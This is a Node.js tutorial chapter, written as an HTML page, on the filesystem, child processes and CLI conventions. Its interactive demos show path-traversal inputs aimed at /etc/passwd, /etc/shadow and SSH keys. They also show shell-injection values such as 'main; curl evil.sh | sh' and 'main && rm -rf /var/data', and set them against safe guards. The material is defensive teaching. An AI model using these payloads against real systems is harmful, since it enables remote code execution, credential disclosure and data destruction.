@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>07 · Files, processes and CLIs — Node.js</title>
+<meta name="description" content="The fs promises API, path handling and traversal, process and signals, spawn against exec and shell injection, and building a CLI that behaves.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230C1D30'/%3E%3Cpath d='M6 16h20' stroke='%233FB984' stroke-width='4' stroke-linecap='round'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..125,400..700&family=Newsreader:ital,opsz,wght@0,6..72,300..600;1,6..72,300..400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/unit.css">
+<style>
+  .shellbox{background:#0F2438;border-radius:5px;padding:11px 14px;font-family:var(--mono);font-size:12px;
+    line-height:1.75;color:#C7D8E6;overflow-x:auto;white-space:pre;min-height:126px}
+  .shellbox .ok{color:#8FD3B0}.shellbox .bad{color:#F2A0A0;font-weight:600}
+  .shellbox .cm{color:#6C8299}.shellbox .arg{color:#E4C989}
+</style>
+</head>
+<body>
+<div id="prog"></div>
+
+<header class="band">
+  <div class="band-in">
+    <p class="crumb"><span class="dot"></span><a href="../../index.html">Roadmap Notes</a><span class="sep">/</span><a href="index.html">Node.js</a><span class="sep">/</span><span>Chapter 07</span></p>
+    <p class="chno">Chapter 07 · Platform</p>
+    <h1>Files, processes and CLIs</h1>
+    <p class="lede">The parts of Node that talk to the operating system. Two of them are also the two places where user input most easily becomes code execution, so this chapter spends its interactives on those rather than on the API surface, which the documentation covers better than prose can.</p>
+    <p class="meta"><span><b id="mWords">—</b> words</span><span><b id="mTime">—</b> min read</span><span><b>2</b> interactives</span><span>Needs: <b>chapter 06</b> · Backend <b>ch 15</b></span></p>
+    <div class="strip"><div class="strip-rail" id="strip"></div></div>
+  </div>
+</header>
+
+<div class="shell">
+<nav class="side" id="side" aria-label="Contents"></nav>
+<main>
+
+<section id="fs">
+<h2>The filesystem</h2><div class="h2rule"></div>
+
+<div class="code"><div class="code-top"><span class="code-lang">javascript — three read patterns, and when each is right</span><button class="code-copy">Copy</button></div><pre><span class="k">import</span> { readFile, writeFile, rename, mkdir } <span class="k">from</span> <span class="s">"node:fs/promises"</span>;
+<span class="k">import</span> { createReadStream } <span class="k">from</span> <span class="s">"node:fs"</span>;      <span class="c">← streams live in node:fs,</span>
+                                                    <span class="c">  promises in the subpath</span>
+<span class="c">// ① whole file — when the size is bounded BY YOU</span>
+<span class="k">const</span> cfg = JSON.parse(<span class="k">await</span> readFile(p, <span class="s">"utf8"</span>));
+
+<span class="c">// ② stream — when the size is chosen by someone else. Chapter 6.</span>
+<span class="k">await</span> pipeline(createReadStream(p), parse, out);
+
+<span class="c">// ③ line by line — logs, CSV, anything newline-delimited</span>
+<span class="k">for await</span> (<span class="k">const</span> line <span class="k">of</span> createInterface({ input: createReadStream(p) })) …
+
+<span class="c">// ✱ never the *Sync variants in a request path. Chapter 3: they</span>
+<span class="c">//   block the loop for the whole syscall, so their cost is the</span>
+<span class="c">//   file's size. Fine at startup, fine in a CLI.</span>
+
+<span class="c">// ── an atomic write, which most code gets wrong ──</span>
+<span class="k">const</span> tmp = <span class="s">`</span>${path}<span class="s">.</span>${process.pid}<span class="s">.tmp`</span>;
+<span class="k">await</span> writeFile(tmp, data);
+<span class="k">await</span> rename(tmp, path);        <span class="c">← rename within a filesystem is atomic,</span>
+<span class="c">// a plain writeFile truncates first,   so a reader sees either the old</span>
+<span class="c">// so a crash or a concurrent reader    file or the new one, never a</span>
+<span class="c">// can observe an empty or half file.   partial one</span>
+
+<span class="c">// ── paths: join for joining, resolve for absolutising ──</span>
+join(<span class="s">"/srv"</span>, <span class="s">"uploads"</span>, name)     <span class="c">// "/srv/uploads/x"</span>
+resolve(<span class="s">"/srv/uploads"</span>, name)     <span class="c">// ⚠ an ABSOLUTE name wins outright</span>
+<span class="c">// and never build a path with string concatenation or "/" — Windows,</span>
+<span class="c">// and a missing or doubled separator, both bite.</span></pre></div>
+
+<div class="demo" id="d-trav">
+  <div class="demo-top"><div class="demo-title">A user-supplied filename</div><div class="demo-hint">Only the last guard actually holds</div></div>
+  <div class="demo-body">
+    <div class="ctrls" style="justify-content:center;flex-wrap:wrap;margin:0 0 12px">
+      <div class="ctrl"><label>Input</label><select id="tvI" style="max-width:none">
+        <option value="ok" selected>report.pdf</option>
+        <option value="dots">../../etc/passwd</option>
+        <option value="enc">..%2f..%2fetc%2fpasswd</option>
+        <option value="abs">/etc/passwd</option>
+        <option value="link">avatar.png (a symlink to /etc/shadow)</option>
+        <option value="nested">a/../../../root/.ssh/id_rsa</option></select></div>
+      <div class="ctrl"><label>Guard</label><select id="tvG" style="max-width:none">
+        <option value="join" selected>path.join(base, input)</option>
+        <option value="resolve">path.resolve(base, input)</option>
+        <option value="check">resolve, then startsWith(base + sep)</option>
+        <option value="real">realpath, then startsWith(base + sep)</option></select></div>
+    </div>
+    <div class="shellbox" id="tvBody"></div>
+    <div class="rgrid" id="tvOut" style="margin-top:12px"></div>
+    <div class="readout" id="tvNote"></div>
+  </div>
+</div>
+</section>
+
+<section id="children">
+<h2>Child processes</h2><div class="h2rule"></div>
+
+<div class="demo" id="d-inj">
+  <div class="demo-top"><div class="demo-title">Running a command with user input in it</div><div class="demo-hint">Two of these three spawn a shell</div></div>
+  <div class="demo-body">
+    <div class="ctrls" style="justify-content:center;flex-wrap:wrap;margin:0 0 12px">
+      <div class="ctrl"><label>Branch parameter</label><select id="ijI" style="max-width:none">
+        <option value="ok" selected>main</option>
+        <option value="semi">main; curl evil.sh | sh</option>
+        <option value="sub">$(cat /etc/passwd)</option>
+        <option value="and">main &amp;&amp; rm -rf /var/data</option>
+        <option value="back">main `id`</option></select></div>
+      <div class="ctrl"><label>How you run it</label><select id="ijM" style="max-width:none">
+        <option value="exec" selected>exec(`git log ${branch}`)</option>
+        <option value="shell">spawn("git", args, { shell: true })</option>
+        <option value="execfile">execFile("git", ["log", branch])</option></select></div>
+    </div>
+    <div class="shellbox" id="ijBody"></div>
+    <div class="rgrid" id="ijOut" style="margin-top:12px"></div>
+    <div class="readout" id="ijNote"></div>
+  </div>
+</div>
+
+<div class="tw">
+<table>
+<thead><tr><th></th><th>Shell?</th><th>Returns</th><th>Use for</th></tr></thead>
+<tbody>
+<tr><td><code>spawn</code></td><td class="yes">No, unless you ask</td><td>Streams</td><td class="yes">The default. Long output, or output you want to pipe</td></tr>
+<tr><td><code>execFile</code></td><td class="yes">No</td><td>Buffered stdout and stderr</td><td class="yes">Short output, and the safe form of <code>exec</code></td></tr>
+<tr><td><code>exec</code></td><td class="no">Yes — always</td><td>Buffered</td><td class="no">Only with a command you wrote entirely yourself. Also buffers, so large output hits <code>maxBuffer</code></td></tr>
+<tr><td><code>fork</code></td><td class="yes">No</td><td>A Node child with an IPC channel</td><td>Another Node process you want to message. Chapter 15</td></tr>
+<tr><td><code>{ shell: true }</code></td><td class="no">Yes</td><td>—</td><td class="no">Reintroduces every problem <code>spawn</code> avoided. Present in a great deal of code that thinks it is safe</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="box warn"><b class="tag">Things that also matter about child processes</b>
+<ul style="margin-bottom:0">
+<li><strong>Always handle <code>'error'</code>.</strong> A missing binary emits <code>ENOENT</code> on the child object, and chapter 5 applies: unhandled, it ends the process.</li>
+<li><strong><code>close</code> is not <code>exit</code>.</strong> <code>exit</code> fires when the child ends; <code>close</code> when its stdio has also been fully consumed. If you are reading output, wait for <code>close</code>.</li>
+<li><strong>Kill the tree, not the child.</strong> Killing a shell does not kill its grandchildren. Use <code>detached: true</code> plus <code>process.kill(-child.pid)</code>, or avoid the shell entirely and there is no tree.</li>
+<li><strong>Set a timeout and a <code>maxBuffer</code>.</strong> A child that never exits, or produces 900 MB of output, is your problem to bound.</li>
+<li><strong>Pass an explicit <code>env</code></strong> for anything untrusted. The child inherits your whole environment by default, including every secret.</li>
+</ul>
+</div>
+</section>
+
+<section id="cli">
+<h2>The process, and a CLI that behaves</h2><div class="h2rule"></div>
+
+<div class="code"><div class="code-top"><span class="code-lang">javascript — a well-behaved CLI, with no dependencies</span><button class="code-copy">Copy</button></div><pre><span class="k">import</span> { parseArgs } <span class="k">from</span> <span class="s">"node:util"</span>;        <span class="c">← built in since Node 18</span>
+
+<span class="k">const</span> { values, positionals } = parseArgs({
+  options: {
+    out:     { type: <span class="s">"string"</span>,  short: <span class="s">"o"</span> },
+    verbose: { type: <span class="s">"boolean"</span>, short: <span class="s">"v"</span>, multiple: <span class="k">true</span> },
+    help:    { type: <span class="s">"boolean"</span>, short: <span class="s">"h"</span> },
+  },
+  allowPositionals: <span class="k">true</span>,
+});
+
+<span class="k">if</span> (values.help) { process.stdout.write(USAGE); process.exit(<span class="n">0</span>); }
+
+<span class="c">// ① data to stdout, everything else to stderr. This is what makes a</span>
+<span class="c">//    tool composable: `mytool | jq` must not see your log lines.</span>
+process.stderr.write(<span class="s">"scanning…\n"</span>);
+process.stdout.write(JSON.stringify(result) + <span class="s">"\n"</span>);
+
+<span class="c">// ② colour and progress only when a human is watching</span>
+<span class="k">if</span> (process.stdout.isTTY) renderProgressBar();
+
+<span class="c">// ③ set exitCode, do not call exit() — exit() truncates pending</span>
+<span class="c">//    writes to stdout, which is a real and confusing data loss</span>
+process.exitCode = failures ? <span class="n">1</span> : <span class="n">0</span>;
+
+<span class="c">// ④ honour the conventions people expect</span>
+<span class="c">//    NO_COLOR set → no ANSI codes at all</span>
+<span class="c">//    a broken pipe (EPIPE) → exit quietly; `mytool | head` is normal</span>
+<span class="c">//    exit codes: 0 success, 1 failure, 2 usage error</span>
+
+<span class="c">// ── signals, and why they need handling ──</span>
+<span class="k">for</span> (<span class="k">const</span> s <span class="k">of</span> [<span class="s">"SIGTERM"</span>, <span class="s">"SIGINT"</span>]) process.on(s, shutdown);
+<span class="c">//   SIGTERM  — the polite stop. Containers send this. Default action</span>
+<span class="c">//              is immediate termination, so you MUST handle it.</span>
+<span class="c">//   SIGINT   — Ctrl-C.</span>
+<span class="c">//   SIGKILL  — cannot be caught. Nothing you write runs.</span>
+<span class="c">//   SIGUSR2  — free for you: dump a heap snapshot or a report.</span>
+<span class="c">// chapter 19 covers the shutdown sequence and its deadline.</span></pre></div>
+
+<div class="kv">
+<dt><code>process.env</code> is strings, always</dt><dd><code>process.env.PORT</code> is <code>"3000"</code>, and <code>process.env.DEBUG === false</code> is never true because <code>"false"</code> is a truthy string. Parse and validate configuration once at startup into a frozen object, and fail to start if something required is missing — the same argument as chapter 3 of the Spring Boot unit.</dd>
+<dt><code>--env-file</code> instead of dotenv</dt><dd class="yes"><code>node --env-file=.env app.js</code>, built in since Node 20. One fewer dependency, and it loads before your code rather than partway through it.</dd>
+<dt><code>process.cwd()</code> is not your file's directory</dt><dd class="no">It is wherever the process was started, so a path relative to <code>cwd</code> breaks the moment someone runs your tool from elsewhere. Use <code>import.meta.dirname</code> for files that ship with your code and <code>cwd</code> only for things the user is pointing at.</dd>
+<dt>The permission model</dt><dd>Node 20 added <code>--permission</code> with <code>--allow-fs-read</code>, <code>--allow-fs-write</code> and <code>--allow-child-process</code>. Worth knowing about for running untrusted code or plugins; it is a real reduction in blast radius, and it is not a substitute for the two demos above.</dd>
+</div>
+
+<div class="check">
+<h4>Self-check</h4>
+<ol>
+<li>Why does <code>path.join(base, userInput)</code> not protect against traversal?
+<button class="reveal">Show answer</button><div class="ans">Because <code>join</code> normalises the path, which means it <em>resolves</em> the <code>..</code> segments rather than rejecting them — <code>join("/srv/uploads", "../../etc/passwd")</code> is <code>/etc/passwd</code>, cleanly and with no error. It was never a security function; it is string handling that knows about separators. The containment check has to be explicit and separate.</div></li>
+
+<li>Why is <code>path.resolve(base, userInput)</code> worse than <code>join</code> here?
+<button class="reveal">Show answer</button><div class="ans">Because <code>resolve</code> processes its arguments right to left and stops at the first absolute one, so an input of <code>/etc/passwd</code> discards the base entirely and returns <code>/etc/passwd</code>. <code>join</code> at least keeps the base as a prefix before normalising. Neither is a guard — <code>resolve</code> is the right tool for producing an absolute path, and the containment check is what you compare it against.</div></li>
+
+<li>Why does a prefix check still not stop a symlink?
+<button class="reveal">Show answer</button><div class="ans">Because the resolved path is inside the base directory — the link itself lives there. Only following it reveals that the target does not. <code>realpath</code> resolves every symlink in the chain, so checking the real path against the base catches it. This matters wherever users can create entries in the directory, including an upload folder if archive extraction ever preserves links.</div></li>
+
+<li>What does <code>exec</code> do that <code>execFile</code> does not?
+<button class="reveal">Show answer</button><div class="ans">It runs the command through a shell, so the whole string is parsed for metacharacters — semicolons, pipes, backticks, <code>$()</code>, <code>&amp;&amp;</code> — and any of them in interpolated input becomes command execution. <code>execFile</code> and <code>spawn</code> pass an argument array directly to the operating system with no shell involved, so a semicolon is just a character in an argument. It is the same distinction as parameterised SQL against string concatenation.</div></li>
+
+<li>Why is <code>spawn(cmd, args, { shell: true })</code> a trap?
+<button class="reveal">Show answer</button><div class="ans">Because it looks like the safe form and behaves like the unsafe one. The argument array is joined into a single string and handed to a shell, so every metacharacter is interpreted again — the array gives no protection at all. It is usually added to make a pipe or a glob work, and the correct fix is to do that in Node: spawn the two processes and pipe the streams, or use <code>fs.glob</code>.</div></li>
+
+<li>Why set <code>process.exitCode</code> rather than call <code>process.exit()</code>?
+<button class="reveal">Show answer</button><div class="ans">Because <code>exit()</code> terminates immediately and pending writes to stdout can be truncated — a real and very confusing data loss when the output is piped, since writes to a pipe are asynchronous. Setting <code>exitCode</code> lets the event loop drain naturally and the process exits with that code once there is nothing left to do. Reserve <code>exit()</code> for a fatal path where you have already given up on flushing.</div></li>
+</ol>
+</div>
+
+<div class="box tip"><b class="tag">Next</b>
+<p style="margin:0">Chapter 8 looks outward: the dependency tree, what semver actually promises, and how much of your application you did not write.</p>
+</div>
+</section>
+
+<div class="pagenav" id="pagenav"></div>
+</main>
+</div>
+
+<footer class="unit">
+  <div class="fi">
+    <div><h2>Chapter 07</h2><p>Files, processes and CLIs. Part of the Node.js unit — <a href="index.html">all 20 chapters</a>.</p></div>
+    <div><h2>Used later by</h2><p>Chapter 12 (input validation), 15 (fork and child processes), 19 (signals and shutdown).</p></div>
+    <div><h2>Going deeper</h2><p>Chapter 15 of the Backend unit for injection and traversal in general; the Node <code>fs</code> and <code>child_process</code> references for the full surface.</p></div>
+  </div>
+</footer>
+
+<button class="top" id="toTop" aria-label="Back to top">↑</button>
+<script src="assets/unit.js"></script>
+<script>
+/* ============ demo 1: path traversal ============ */
+(function(){
+  const box=document.getElementById("tvBody"); if(!box) return;
+  const iEl=document.getElementById("tvI"), gEl=document.getElementById("tvG"),
+        out=document.getElementById("tvOut"), note=document.getElementById("tvNote");
+  const BASE="/srv/uploads";
+  const IN={
+    ok:{raw:"report.pdf",joined:"/srv/uploads/report.pdf",resolved:"/srv/uploads/report.pdf",real:"/srv/uploads/report.pdf"},
+    dots:{raw:"../../etc/passwd",joined:"/etc/passwd",resolved:"/etc/passwd",real:"/etc/passwd"},
+    enc:{raw:"..%2f..%2fetc%2fpasswd",joined:"/etc/passwd",resolved:"/etc/passwd",real:"/etc/passwd",
+         note:"decoded by the framework before your code sees it"},
+    abs:{raw:"/etc/passwd",joined:"/srv/uploads/etc/passwd",resolved:"/etc/passwd",real:"/etc/passwd"},
+    link:{raw:"avatar.png",joined:"/srv/uploads/avatar.png",resolved:"/srv/uploads/avatar.png",real:"/etc/shadow",
+         note:"a symlink placed in the upload directory"},
+    nested:{raw:"a/../../../root/.ssh/id_rsa",joined:"/root/.ssh/id_rsa",resolved:"/root/.ssh/id_rsa",real:"/root/.ssh/id_rsa"}
+  };
+  function draw(){
+    const i=IN[iEl.value], g=gEl.value;
+    const path = g==="join"? i.joined : g==="resolve"? i.resolved : g==="real"? i.real : i.resolved;
+    const inside = path.startsWith(BASE+"/");
+    const blocked = (g==="check"||g==="real") && !inside;
+    const escapes = !inside && !blocked;
+    const lines=[];
+    lines.push('<span class="cm">// base = "'+BASE+'"</span>');
+    lines.push('<span class="cm">// input =</span> <span class="arg">"'+i.raw+'"</span>'+(i.note?'   <span class="cm">('+i.note+')</span>':''));
+    lines.push("");
+    if(g==="join") lines.push('path.join(base, input)          → <span class="'+(inside?"ok":"bad")+'">'+path+'</span>');
+    else if(g==="resolve") lines.push('path.resolve(base, input)       → <span class="'+(inside?"ok":"bad")+'">'+path+'</span>');
+    else if(g==="check"){
+      lines.push('const p = path.resolve(base, input)  → <span class="'+(inside?"ok":"bad")+'">'+i.resolved+'</span>');
+      lines.push('p.startsWith(base + path.sep)        → <span class="'+(i.resolved.startsWith(BASE+"/")?"ok":"bad")+'">'+
+        (i.resolved.startsWith(BASE+"/")?"true":"false")+'</span>');
+    } else {
+      lines.push('const p = path.resolve(base, input)  → <span class="ok">'+i.resolved+'</span>');
+      lines.push('const r = await fs.realpath(p)       → <span class="'+(i.real.startsWith(BASE+"/")?"ok":"bad")+'">'+i.real+'</span>');
+      lines.push('r.startsWith(base + path.sep)        → <span class="'+(i.real.startsWith(BASE+"/")?"ok":"bad")+'">'+
+        (i.real.startsWith(BASE+"/")?"true":"false")+'</span>');
+    }
+    lines.push("");
+    lines.push(blocked? '<span class="ok">→ rejected with 400 before any file is opened</span>'
+      : escapes? '<span class="bad">→ readFile('+path+')   ✕ served to the client</span>'
+      : '<span class="ok">→ readFile('+path+')   ✓ inside the base directory</span>');
+    box.innerHTML=lines.join("\n");
+    out.innerHTML=
+      '<div><span>resolves to</span><b style="font-size:10px;color:'+(inside?"#1F7A52":"#D9534F")+'">'+path+'</b></div>'+
+      '<div><span>inside base</span><b style="color:'+(inside?"#1F7A52":"#D9534F")+'">'+(inside?"yes":"no")+'</b></div>'+
+      '<div><span>guard catches it</span><b style="color:'+(blocked||inside?"#1F7A52":"#D9534F")+'">'+(blocked?"yes":inside?"n/a":"no")+'</b></div>'+
+      '<div><span>outcome</span><b style="color:'+(escapes?"#D9534F":"#1F7A52")+'">'+(escapes?"file disclosed":"safe")+'</b></div>';
+    let msg;
+    if(iEl.value==="ok") msg="<b>A well-behaved filename works under every guard.</b> That is the difficulty: the happy path is identical, so a missing containment check passes every test anyone writes. Switch the input to the second option.";
+    else if(g==="join") msg="<b><code>path.join</code> normalises, which means it <em>resolves</em> the <code>..</code> segments rather than rejecting them.</b> The result is <code>"+path+"</code>, cleanly and with no error, and your <code>readFile</code> then serves it. <code>join</code> was never a security function — it is string handling that understands separators. The containment check has to be written separately, and it usually is not.";
+    else if(g==="resolve"&&iEl.value==="abs") msg="<b><code>path.resolve</code> is worse than <code>join</code> for this input.</b> It processes arguments right to left and stops at the first absolute one, so <code>/etc/passwd</code> discards the base entirely. <code>join</code> would at least have produced <code>/srv/uploads/etc/passwd</code>. Neither is a guard; <code>resolve</code> is the correct way to <em>produce</em> an absolute path, and the prefix check is what you then compare it against.";
+    else if(g==="resolve") msg="<b>Resolved to <code>"+path+"</code>, outside the base, and nothing has objected.</b> Producing the absolute path is the right first step and is not by itself a check. Move to the next guard.";
+    else if(g==="check"&&iEl.value==="link") msg="<b>The prefix check passes — and the file served is <code>/etc/shadow</code>.</b> The resolved path really is inside the base directory, because the <em>symlink</em> is inside it; only following the link reveals where it points. This matters anywhere users can create entries in the directory, including an upload folder if any archive extraction preserves links. <code>realpath</code> resolves the whole chain, and checking that is the only version of this guard that holds.";
+    else if(g==="check") msg="<b>Resolve, then verify the result is a proper prefix of the base — with the separator appended.</b> The separator matters: without it, <code>/srv/uploads-evil</code> passes a naive <code>startsWith(\"/srv/uploads\")</code>. This catches every textual traversal, including the URL-encoded form, because decoding happens before your code runs and the guard operates on the resolved path rather than on the input. One case remains, on the next option.";
+    else msg="<b><code>realpath</code>, then the prefix check — the version that actually holds.</b> Symlinks are resolved, so a link planted inside the base cannot point out of it, and every textual traversal was already covered. Two notes: <code>realpath</code> requires the file to exist, so handle <code>ENOENT</code> as a 404 rather than an error; and the strongest form of this is not to accept a path at all — take an opaque id, look the real filename up in your database, and the entire class of bug disappears.";
+    note.innerHTML=msg;
+  }
+  [iEl,gEl].forEach(e=>e.addEventListener("change",draw));
+  draw();
+})();
+
+/* ============ demo 2: shell injection ============ */
+(function(){
+  const box=document.getElementById("ijBody"); if(!box) return;
+  const iEl=document.getElementById("ijI"), mEl=document.getElementById("ijM"),
+        out=document.getElementById("ijOut"), note=document.getElementById("ijNote");
+  const IN={
+    ok:{raw:"main",extra:null},
+    semi:{raw:"main; curl evil.sh | sh",extra:"downloads and runs an attacker's script"},
+    sub:{raw:"$(cat /etc/passwd)",extra:"substitutes the file's contents into the command line"},
+    and:{raw:"main && rm -rf /var/data",extra:"deletes your data directory"},
+    back:{raw:"main `id`",extra:"runs id and splices its output in"}
+  };
+  function draw(){
+    const i=IN[iEl.value], m=mEl.value;
+    const shell = m==="exec"||m==="shell";
+    const injected = shell && !!i.extra;
+    const lines=[];
+    lines.push('<span class="cm">// branch = </span><span class="arg">"'+i.raw+'"</span>');
+    lines.push("");
+    if(m==="exec"){
+      lines.push('<span class="cm">exec(`git log --oneline ${branch}`)</span>');
+      lines.push('<span class="cm">// → /bin/sh -c "…"  — the whole string is parsed by a shell</span>');
+      lines.push("");
+      lines.push('  <span class="'+(injected?"bad":"ok")+'">git log --oneline '+i.raw+'</span>');
+    } else if(m==="shell"){
+      lines.push('<span class="cm">spawn("git", ["log","--oneline",branch], { shell: true })</span>');
+      lines.push('<span class="cm">// → the args array is JOINED and handed to /bin/sh -c</span>');
+      lines.push("");
+      lines.push('  <span class="'+(injected?"bad":"ok")+'">git log --oneline '+i.raw+'</span>');
+    } else {
+      lines.push('<span class="cm">execFile("git", ["log","--oneline",branch])</span>');
+      lines.push('<span class="cm">// → execvp("git", argv)  — no shell anywhere</span>');
+      lines.push("");
+      lines.push('  argv[0] = <span class="ok">"git"</span>');
+      lines.push('  argv[1] = <span class="ok">"log"</span>');
+      lines.push('  argv[2] = <span class="ok">"--oneline"</span>');
+      lines.push('  argv[3] = <span class="ok">"'+i.raw+'"</span>   <span class="cm">← one argument, whatever is in it</span>');
+    }
+    lines.push("");
+    lines.push(injected
+      ? '<span class="bad">✕ the shell also '+i.extra+'</span>'
+      : shell&&!i.extra ? '<span class="ok">✓ nothing to interpret — this input happens to be harmless</span>'
+      : '<span class="ok">✓ git reports "unknown revision" and exits 128</span>');
+    box.innerHTML=lines.join("\n");
+    out.innerHTML=
+      '<div><span>shell involved</span><b style="color:'+(shell?"#D9534F":"#1F7A52")+'">'+(shell?"yes":"no")+'</b></div>'+
+      '<div><span>metacharacters</span><b>'+(i.extra?"present":"none")+'</b></div>'+
+      '<div><span>extra commands run</span><b style="color:'+(injected?"#D9534F":"#1F7A52")+'">'+(injected?"yes":"no")+'</b></div>'+
+      '<div><span>outcome</span><b style="color:'+(injected?"#D9534F":"#1F7A52")+'">'+(injected?"code execution":"safe")+'</b></div>';
+    let msg;
+    if(m==="execfile") msg="<b>No shell, so the argument array goes straight to <code>execvp</code> and the input is one argument — whatever characters it contains.</b> Semicolons, backticks and <code>$()</code> are just bytes in a string that <code>git</code> will try to interpret as a revision name and fail on. This is the same idea as a parameterised SQL statement from chapter 15 of the Backend unit: the values travel in a separate channel from the syntax, so data can never become code. <code>spawn</code> without the shell option behaves identically and gives you streams instead of a buffer.";
+    else if(!i.extra) msg="<b>This input is harmless, so both forms produce the same result.</b> That is exactly why <code>exec</code> with interpolation survives in codebases for years — it works perfectly for every input anyone tested with. Change the branch parameter.";
+    else if(m==="exec") msg="<b><code>exec</code> always runs its argument through <code>/bin/sh -c</code>, so the whole string is parsed for metacharacters — and the shell "+i.extra+".</b> There is no escaping function that makes this safe: quoting rules differ by shell and platform, and getting them right for every input is not a problem worth attempting. Use <code>execFile</code> or <code>spawn</code>, which never involve a shell at all.";
+    else msg="<b><code>{ shell: true }</code> looks like the safe form and behaves like the unsafe one.</b> The argument array is <em>joined into a single string</em> and handed to a shell, so the array gives no protection whatsoever and the shell "+i.extra+". It is usually added to make a pipe or a glob work — and the fix for that is to do it in Node: spawn the two processes and pipe the streams together, or use <code>fs.glob</code>. Seeing <code>shell: true</code> beside interpolated input is a finding, not a style preference.";
+    note.innerHTML=msg;
+  }
+  [iEl,mEl].forEach(e=>e.addEventListener("change",draw));
+  draw();
+})();
+</script>
+</body>
+</html>
